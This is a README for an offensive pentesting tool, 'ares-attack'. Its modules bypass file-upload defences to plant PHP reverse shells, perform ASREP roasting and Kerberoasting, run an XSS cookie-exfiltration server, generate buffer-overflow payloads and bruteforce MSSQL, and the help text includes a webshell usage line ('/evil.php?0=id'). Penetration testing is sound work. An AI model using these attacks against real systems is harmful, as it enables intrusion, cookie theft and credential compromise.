# ares-attack
Ares helps Pentesters prepare for war by performing simple attacks against Web Apps and Windows targets (WAR files sold seperately).

## Table of Contents

- [Setup](#setup)
- [Functionality](#functionality)
- [Uploader](#uploader)
- [Roasting](#roasting)
- [XSS](#xss)
- [Mutator](#mutator)
- [Overflower](#overflower)
- [MSSQL Pwner](#mssql-pwner)
- [Related Projects](#related-projects)


## Setup
After installing the dependencies, navigate to this Repo's directory & run `setup.sh`. 

Depending on how they are installed, the name of Impacket's tools can vary (e.g. impacket-GetNPUsers vs GetNPUsers.py). This script ensures that tool names use the proper format.

`bash ./setup.sh`

### Dependencies
impacket-GetNPUsers

impacket-GetUserSPNs

impacket-mssqlclient

crunch

## Functionality
```
Ares will interactively prompt you for input unless you provide the necessary arguments for the selected module.
	
[Options]
	-h: Show this help message
	-m <MODULE>: Specify the module you want to use

[Modules]
	upload: Bypass file upload defenses to get a backdoor on a Web App. Currently, Uploader only supports PHP file types
	roast: ASREP Roasting & Kerberoasting
	xss: Setup for XSS cookie exfil
	mutate: Wordlist mutation
	bof: Buffer Overflow payload generator
	mssql: Bruteforce MSSQL in Active Directory environment
```

### Uploader
Bypass common File Upload defenses.

```
[Options]
	-h: Display this help message
	-i <IP_Addres>: The IP Address to use for the Reverse Shell payload (i.e. your interface)
	-p <PORT>: The port that your listener is running on
	-u <URL>: The target URL that's used in POST Requests to upload a file
	-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name="file")
	-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.
	-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.
	-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e

[Example Usage]
	ares -m upload -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
	ares -m upload -u http://10.10.40.117/panel/ -n fileUpload -b

[Supported File Types]

Currently, Uploader only supports PHP files. More file types will be added in subsequent updates.
```

### Roasting
Perform ASREP Roasting & Kerberoasting.

### XSS
Ensure that your account has the privileges needed to listen on the port you specified for the Flask server.

This module performs the following 3 actions:

1) Starts a Flask server that will recieve a target's Cookies & save them to a file.

2) Creates an example XSS payload which will send the target's Cookies to the Flask server.

3) Redirects the target to a specified URL (i.e. an inconspicuous page on the website).

### Mutator
Modify wordlist entries & optionally convert them to an alternate format (i.e., Base64 Encoded or as a hash).

Some Web Apps want credentials supplied in B64 or as a password hash, so this prepares a wordlist that can be used with your favorite bruteforcing tool (e.g., `hydra`, `patator`, or `ffuf`).

### Overflower
Generate a binary payload using the specified address & offset.

### MSSQL Pwner
Unlike `hydra`, `impacket-mssqlclient` supports the use of SSPI authentication for MSSQL servers.

This makes it more reliable in an Active Directory environment, but it doesn't come with any bruteforcing functionality.

Ares uses a simple wrapper program to add bruteforcing capabilities to `impacket-mssqlclient`.

## Related Projects
Check out the rest of the Pentesting Pantheon:

Perform recon to see everything your target is hiding with Argus (https://github.com/Komodo-pty/argus-recon/)

Hunt for shells with Artemis (https://github.com/Komodo-pty/artemis-hunter)

Perform Post-Exploitation enumeration against Windows hosts with Hades (https://github.com/Komodo-pty/hades-PrivEsc)
